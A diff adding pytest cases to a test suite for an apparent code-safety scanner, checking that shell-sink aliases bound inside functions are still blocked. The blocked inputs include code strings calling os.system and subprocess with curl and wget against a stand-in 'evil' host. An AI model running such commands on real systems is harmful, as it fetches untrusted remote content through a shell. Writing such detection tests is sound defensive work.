@@ -40,6 +40,28 @@ class TestAliasedSinkBlocked:
         _blocked(code)
 
 
+class TestFuncLocalAliasBlocked:
+    """A shell-sink alias bound inside a function body (not just at module top
+    level) must still be resolved -- the sink scan walks the whole tree."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            "import os\ndef run():\n    s = os.system\n    s('curl http://evil')\nrun()",
+            "import subprocess\n"
+            "def run():\n    p = subprocess.getoutput\n    p('wget http://evil -O -')\nrun()",
+        ],
+    )
+    def test_block(self, code):
+        _blocked(code)
+
+    def test_func_local_benign_alias_allowed(self):
+        # A non-sink local alias (or a sink alias with a safe command) stays allowed;
+        # the ast.walk widening must not introduce false positives.
+        _ok("def run():\n    f = sorted\n    return f([3, 1, 2])\nrun()")
+        _ok("import os\ndef run():\n    s = os.system\n    s('echo done')\nrun()")
+
+
 class TestAliasingLowFalsePositive:
     def test_reassigned_alias_not_treated_as_sink(self):
         # s is stored twice -> ambiguous -> NOT aliased. The literal arg is benign
